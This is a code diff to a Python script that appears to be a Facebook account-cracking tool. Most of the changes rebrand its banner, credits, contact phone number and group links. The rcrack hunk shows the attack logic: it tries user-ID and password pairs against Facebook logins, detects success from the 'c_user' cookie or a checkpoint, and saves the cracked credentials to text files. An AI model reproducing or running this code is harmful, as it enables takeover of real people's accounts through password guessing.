@@ -104,24 +104,27 @@ for xd in range(10000):
 	ugen.append(uaku2)
 
 logo=("""\033[1;37m
- \033[1;31mdb   dD d888888b d8b   db  d888b 
- \033[1;32m88 ,8P'   `88'   888o  88 88' Y8b
- \033[1;33m88,8P      88    88V8o 88 88       \033[1;34m𝐏 \033[1;37m
- \033[1;34m88`8b      88    88 V8o88 88  ooo.\033[1;31m 𝐑\033[1;37m
- \033[1;35m88 `88.   .88.   88  V888 88. ~8~  \033[1;35m𝐎 \033[1;37m
- \033[1;36mYP   YD Y888888P VP   V8P  Y888P   
+  \033[1;31m.d8888b.  8888888b.  888    d8P  
+ \033[1;31md88P  Y88b 888   Y88b 888   d8P   
+ \033[1;31mY88b.      888    888 888  d8P    
+ \033[1;31m"Y888b.   888   d88P 888d88K     
+   \033[1;31m"Y88b. 8888888P"  8888888b    
+    \033[1;31m"888 888        888  Y88b   
+ \033[1;31mY88b  d88P 888        888   Y88b  
+  \033[1;31m"Y8888P"  888        888    Y88b 
+                                                                                                  
 \033[1;33m----------------------------------------------
- \033[1;31mAUTHOR    : \033[1;34mNOT FOUND
- \033[1;31mGITHUB    : \033[1;34mNOT FOUND
- \033[1;31mFACEBOOK  : \033[1;34mNOT FOUND
- \033[1;31mTOOL NAME : \033[1;34mNOT FOUND
- \033[1;31mTOOL TYPE : \033[1;34mNOT FOUND
- \033[1;31mVERSION   : \033[1;34mNOT FOUND
+ \033[1;31mAUTHOR    : \033[1;34mSHERAZ-ARAIN
+ \033[1;31mCONTACT    : \033[1;31m+971564382087
+ \033[1;31mFACEBOOK  : \033[1;32mOYE HERO
+ \033[1;31mTOOL NAME : \033[1;34mPAKISTAN
+ \033[1;31mTOOL TYPE : \033[1;35mFREE AND ENJOY 
+ \033[1;31mVERSION   : \033[1;33m2.0
 \033[1;33m----------------------------------------------
 \033[1;34mMai dhundne ko zamane men
 \033[1;31mjab wafa nikla 🙊
 \033[1;34mpata chala ke ghalat leke
-\033[1;31mmain bata nikla 🙈
+\033[1;31mmain pata nikla 🙈
 \033[1;33m----------------------------------------------""")
 
 def lines():
@@ -162,9 +165,9 @@ def riaz():
 	if king1 =='5':
 		riaz()
 	if king1 =='4':
-		os.system('xdg-open http://wa.me/+923301579625?text=SILENT💜🐰Sir😪💕')
+		os.system('xdg-open http://wa.me/+971564382087?text=')
 	if king1 =='3':
-		os.system('xdg-open https://www.facebook.com/profile.php?id=100026028165505&mibextid=ZbWKwL');riaz()
+		os.system('https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN');riaz()
 	if king1 =='2':
 		bangla()
 	else:
@@ -449,21 +452,21 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
-                print('\033[1;32m[KING-ALONE-OK] '+cid+'|'+ps+'\033[0;97m')
-                open('KING-ALONE-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                print('\033[1;32m[PAKISTAN-OK] '+cid+'|'+ps+'\033[0;97m')
+                open('PAKISTAN-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:152]
-                print('\033[1;31m[KING-ALONE-CP] '+uid+' | '+ps+'\x1b[1;97m')
-                open('KING-ALONE-CP.txt', 'a').write(uid+' | '+ps+'\n')
+                print('\033[1;31m[PAKISTAN-CP] '+uid+' | '+ps+'\x1b[1;97m')
+                open('PAKISTAN-CP.txt', 'a').write(uid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r[\033[1;99mKING-ALONE\033[1;99m] %s|\33[1;99mOK:- %s \r'%(loop,len(oks))),
+        sys.stdout.write(f'\r[\033[1;99mPAKISTAN\033[1;99m] %s|\33[1;99mOK:- %s \r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
